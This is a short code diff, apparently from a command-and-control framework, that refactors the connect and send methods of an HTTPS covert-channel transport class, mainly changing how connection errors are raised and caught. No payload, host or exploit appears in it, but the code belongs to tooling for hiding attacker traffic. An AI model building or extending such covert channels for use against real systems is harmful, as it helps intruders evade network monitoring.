@@ -33,23 +33,25 @@ class HTTPSCovertTransport(BaseTransport):
         self._config = config
         self._channel = None
 
-    def connect(self) -> bool:
-        try:
-            from c2.https_covert import HTTPSCovertChannel
-            self._channel = HTTPSCovertChannel(self._config)
-            self._connected = True
-            return True
-        except Exception as exc:
-            logger.debug("HTTPS covert connect failed: %s", exc)
-            return False
+    def connect(self) -> None:
+        """Connect the HTTPS covert channel transport.
+
+        Raises on failure, matching ``BaseTransport.connect() -> None``.
+        """
+        from c2.https_covert import HTTPSCovertChannel
+        self._channel = HTTPSCovertChannel(self._config)
+        self._connected = True
 
     def disconnect(self) -> None:
         self._channel = None
         self._connected = False
 
-    def send(self, data: bytes, metadata: dict[str, str] | None = None) -> bool:
+    def send(self, data: bytes, metadata: dict[str, Any] | None = None) -> bool:
         if self._channel is None:
-            if not self.connect():
+            try:
+                self.connect()
+            except Exception as exc:
+                logger.debug("HTTPS covert auto-connect failed: %s", exc)
                 return False
 
         try:
